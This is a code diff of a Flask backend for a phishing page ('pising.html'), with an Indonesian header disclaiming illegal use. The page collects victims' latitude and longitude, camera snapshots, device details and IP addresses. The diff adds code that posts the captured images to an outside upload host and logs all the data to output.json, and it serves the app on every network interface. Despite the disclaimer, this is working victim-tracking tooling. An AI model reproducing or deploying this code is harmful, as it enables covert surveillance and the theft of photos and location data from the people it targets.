@@ -1,57 +1,95 @@
+# Hello wellcome To My Code
+# Warning: Code inidibuat untuk mempelajari cara kerja Phising
+# Bukan Utuk Kegiatan Ilegall
+# Penggunaaan Ilegall Diluar Taggung Jawab Admin
+# github.com/AmmarrBN & github.com/Hoshiyuki-Api
+
 from flask import Flask, render_template, request, jsonify
-import os
-from datetime import datetime
+import base64
+import json
+import requests
+from io import BytesIO
+from bs4 import BeautifulSoup
 
 app = Flask(__name__)
 
-# Directory untuk menyimpan foto yang diambil
-UPLOAD_FOLDER = 'uploads'
-if not os.path.exists(UPLOAD_FOLDER):
-    os.makedirs(UPLOAD_FOLDER)
+def upload_image(buffer, filename):
+    # Fungsi From Data Nya dan Uploader
+    form = {
+        "file": (filename, buffer)
+    }
 
-@app.route('/')
-def index():
-    return render_template('index.html')
-
-@app.route('/submit_data', methods=['POST'])
-def submit_data():
     try:
-        # Ambil data yang dikirim oleh frontend
-        data = request.get_json()
+        response = requests.post("https://uploader.nyxs.pw/upload", files=form)
+        response.raise_for_status()
+        soup = BeautifulSoup(response.text, "html.parser")
+        url = soup.find("a")["href"]
+        
+        if not url:
+            raise Exception("URL not found in response")
 
-        latitude = data.get('latitude')
-        longitude = data.get('longitude')
-        image_data = data.get('image')  # Base64 encoded image
-        device_info = data.get('deviceInfo')
-        device_brand = data.get('deviceBrand')
-        ip_address = data.get('ip')
+        return url
+    except Exception as error:
+        raise Exception(f"Error: {error}")
 
-        # Simpan gambar yang dikirim dalam bentuk file
-        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
-        image_filename = f"{timestamp}.png"
-        image_path = os.path.join(UPLOAD_FOLDER, image_filename)
+@app.route("/")
+def index():
+    return render_template("pising.html")
 
-        # Simpan file gambar dari base64
-        with open(image_path, 'wb') as f:
-            # Menghapus prefix 'data:image/png;base64,' dari base64
-            image_data = image_data.split(',')[1]
-            f.write(bytearray(image_data, 'utf-8'))
+@app.route("/submit_data", methods=["POST"])
+def submit_data():
+    data = request.json
 
-        # Tulis informasi ke log atau database (disini hanya print)
-        print(f"Data diterima:")
-        print(f"Latitude: {latitude}, Longitude: {longitude}")
-        print(f"Device Info: {device_info}")
-        print(f"Device Brand: {device_brand}")
-        print(f"IP Address: {ip_address}")
-        print(f"Image saved as: {image_filename}")
+    # Proses data lokasi
+    latitude = data.get("latitude")
+    longitude = data.get("longitude")
 
-        # Kembalikan respon sukses
-        return jsonify({"message": "Data berhasil diterima dan disimpan!"}), 200
+    if latitude and longitude:
+        print(f"User Allow Location: Latitude={latitude}, Longitude={longitude}")
 
-    except Exception as e:
-        # Tangani error jika terjadi kesalahan
-        print(f"Error: {e}")
-        return jsonify({"message": "Terjadi kesalahan saat memproses data!"}), 500
+        # Save lokasi ke output.json
+        output_data = {
+            "latitude": latitude,
+            "longitude": longitude
+        }
+
+        with open("output.json", "a") as json_file:
+            json.dump(output_data, json_file, indent=4)
+            json_file.write(",\n")
+
+    # Proses data gambar (Upload Gambar)
+    image_data = data.get("image")
+    if image_data:
+        try:
+            image_bytes = base64.b64decode(image_data.split(",")[1])
+            image_url = upload_image(BytesIO(image_bytes), "captured_image.png")
+            print(f"Image uploaded successfully: {image_url}")
+        except Exception as e:
+            print(f"Error uploading image: {e}")
+            image_url = None
+
+    # Log informasi perangkat
+    device_info = data.get("deviceInfo")
+    device_brand = data.get("deviceBrand")
+    ip = data.get("ip")
+    print(f"Device Info: {device_info}")
+    print(f"Device Brand: {device_brand}")
+    print(f"IP Address: {ip}")
+
+    # Append JSON (Biar Rapi)
+    output_data = {
+        "deviceInfo": device_info,
+        "deviceBrand": device_brand,
+        "ip": ip,
+        "image_url": image_url if image_url else "Failed to upload image"
+    }
+
+    # Save ke file output.json
+    with open("output.json", "a") as json_file:
+        json.dump(output_data, json_file, indent=4)
+        json_file.write(",\n")
+
+    return jsonify({"status": "success", "message": "Data received successfully"})
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(debug=True, host="0.0.0.0", port=8989)
